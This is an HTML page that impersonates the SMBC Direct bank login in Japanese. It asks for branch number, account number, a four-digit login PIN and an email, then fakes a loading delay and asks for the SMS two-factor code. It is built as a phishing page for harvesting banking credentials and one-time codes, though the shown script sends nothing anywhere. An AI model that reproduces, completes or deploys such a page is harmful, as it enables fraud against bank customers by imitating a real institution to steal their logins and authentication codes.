<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SMBCダイレクトログイン</title>
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Noto Sans JP', sans-serif;
      margin: 0;
      background: #f6f8f9;
    }

    header {
      background-color: #006341;
      color: white;
      padding: 1rem;
      text-align: center;
    }

    .container {
      max-width: 500px;
      margin: 2rem auto;
      background: white;
      padding: 2rem;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      border-radius: 10px;
      animation: slideIn 0.6s ease-out;
    }

    @keyframes slideIn {
      from { transform: translateY(30px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    label {
      display: block;
      margin-top: 1rem;
    }

    input {
      width: 100%;
      padding: 0.8rem;
      margin-top: 0.3rem;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    button {
      width: 100%;
      background-color: #006341;
      color: white;
      padding: 0.9rem;
      margin-top: 1.5rem;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 1rem;
    }

    button:hover {
      background-color: #004d30;
    }

    .warning {
      background-color: #fff3cd;
      color: #856404;
      padding: 1rem;
      border-left: 5px solid #ffcc00;
      margin-bottom: 1.5rem;
      border-radius: 5px;
      font-size: 0.95rem;
    }

    .spinner {
      display: none;
      margin-top: 1rem;
      text-align: center;
    }

    .spinner div {
      width: 18px;
      height: 18px;
      margin: 0 auto;
      border: 3px solid #006341;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .auth-screen {
      display: none;
      text-align: center;
      padding: 3rem 1rem;
    }

    .auth-screen input {
      max-width: 200px;
      text-align: center;
      font-size: 1.2rem;
      letter-spacing: 0.5rem;
    }

    @media (max-width: 600px) {
      .container {
        margin: 1rem;
        padding: 1rem;
      }
    }
  </style>
</head>
<body>

  <header>
    <h1>SMBCダイレクト ログイン</h1>
  </header>

  <div class="container" id="loginForm">
    <div class="warning">
  ・ 店番号・口座番号・ログイン暗証番号は、お手元の通帳またはキャッシュカードをご確認のうえ、正しくご入力ください。<br>
  ・ 暗証番号は他人に知られないようにご注意ください。
  ・　誤った情報を繰り返し入力するとロックされる可能性があります。

    </div>

    <form id="form">
      <label for="branch">店番号</label>
      <input type="text" id="branch" required pattern="\d{3}" placeholder="例: 123" />

      <label for="account">口座番号</label>
      <input type="text" id="account" required pattern="\d{7}" placeholder="例: 1234567" />

      <label for="password">ログイン暗証番号</label>
      <input type="password" id="password" required pattern="\d{4}" placeholder="4桁の数字" />

      <label for="email">メールアドレス</label>
      <input type="email" id="email" required placeholder="例: your@email.com" />

      <button type="submit">ログイン</button>

      <div class="spinner"><div></div><p>認証中...</p></div>
    </form>
  </div>

  <div class="auth-screen" id="authScreen">
    <h2>二段階認証コードを入力</h2>
    <p>SMSに届いた6桁のコードを入力してください</p>
    <input type="text" pattern="\d{6}" maxlength="6" placeholder="123456" />
    <br><br>
    <button onclick="alert('正しく入力情報が送信されました。');">認証して続行</button>
  </div>

  <script>
    const form = document.getElementById('form');
    const spinner = document.querySelector('.spinner');
    const loginForm = document.getElementById('loginForm');
    const authScreen = document.getElementById('authScreen');

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      if (!form.checkValidity()) {
        alert('すべての項目を正しく入力してください');
        return;
      }

      spinner.style.display = 'block';
      setTimeout(() => {
        loginForm.style.display = 'none';
        authScreen.style.display = 'block';
      }, 2000); // フェイクロード演出
    });
  </script>

</body>
</html>
